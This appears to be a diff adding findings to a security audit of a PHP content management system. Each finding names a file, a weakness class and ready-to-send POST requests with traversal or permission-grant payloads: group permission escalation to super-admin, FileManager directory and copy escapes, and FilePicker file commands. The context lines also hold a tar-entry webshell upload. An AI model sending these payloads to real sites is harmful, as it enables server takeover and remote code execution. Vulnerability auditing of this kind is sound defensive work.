@@ -128,3 +128,42 @@ Frontend module params are prefixed `cntnt01`; admin module params are prefixed 
   ```
 - **Payload:** a `.tar`/`.tar.gz` whose entry name is `../../shell.php` with PHP contents (climb out of uploads into webroot)
 - **Description:** The custom tar extractor writes each entry to `$dest.$name` without confining to the destination, so a traversal entry name writes anywhere the web user can. Bypasses the upload extension filter (the archive itself is benign) → webshell → RCE. Authenticated (Modify Files).
+
+---
+
+## 11. Privilege Escalation — arbitrary permission grant (group permissions)
+- **Name:** Privilege Escalation / Improper Authorization (CWE-269)
+- **File:** `admin/changegroupperm.php:175-187` (insert loop grants `pg_<permId>_<groupId>` with no check that the actor holds that permission; only `group_id != '1'` is blocked)
+- **URL:**
+  ```
+  POST https://TARGET/admin/changegroupperm.php?__c=KEY
+  submitted=1&pg_<PERM_ID>_<MY_GROUP_ID>=1
+  ```
+- **Payload:** `pg_<perm_id_of_"Modify User-defined Tags">_<attacker_group_id>=1` (any non-1 group)
+- **Description:** A user with only "Manage Groups" can grant any permission to any non-super-admin group, including their own, with no requirement to already hold it. Granting "Modify User-defined Tags" or "Modify Templates" yields RCE; granting "Manage Users" chains to finding #9. Effectively becomes a super-admin. Only literal membership of group 1 is blocked.
+
+---
+
+## 12. Path Traversal — FileManager newdir / copy escape the uploads sandbox
+- **Name:** Path Traversal (CWE-22)
+- **File:** `modules/FileManager/action.newdir.php:20` (`$params['path']` used unvalidated); `modules/FileManager/action.copy.php:36,46` (`$params['destdir']`/`$params['destname']` unvalidated, no `test_valid_path`)
+- **URL:**
+  ```
+  POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,newdir,0&__c=KEY
+  m1_path=../../&m1_newdirname=evil&m1_submit=1
+  ```
+- **Payload:** `m1_path=../../` (newdir) or `m1_destdir=../../` / `m1_destname=../shell.phtml` (copy)
+- **Description:** `newdir` builds the target from the client `path` param without `test_valid_path`, and `copy` uses client `destdir`/`destname` the same way, so directories can be created and files copied outside the uploads directory. Authenticated (Modify Files).
+
+---
+
+## 13. Missing Authorization — FilePicker ajax file commands
+- **Name:** Missing Authorization / Broken Access Control (CWE-862)
+- **File:** `modules/FilePicker/action.ajax_cmd.php` (no `CheckPermission`; mkdir/del/upload gated only by profile flags; default profile has `can_upload`/`can_delete`/`can_mkdir` all enabled per `lib/classes/class.FilePickerProfile.php:49-50`); mkdir `val` allows mid-path `../`
+- **URL:**
+  ```
+  POST https://TARGET/admin/moduleinterface.php?mact=FilePicker,m1_,ajax_cmd,0&__c=KEY
+  cmd=mkdir&cwd=&val=foo/../../../evil
+  ```
+- **Payload:** `cmd=mkdir&val=foo/../../evil` (traversal), or `cmd=del&val=<file>`, or `cmd=upload`
+- **Description:** The action performs no permission check, so any authenticated admin — even one without "Modify Files" — can create/delete/upload files via the always-permissive default profile. The `mkdir` value is not `basename()`-restricted (unlike `del`), so a mid-path `../` creates directories outside the sandbox.
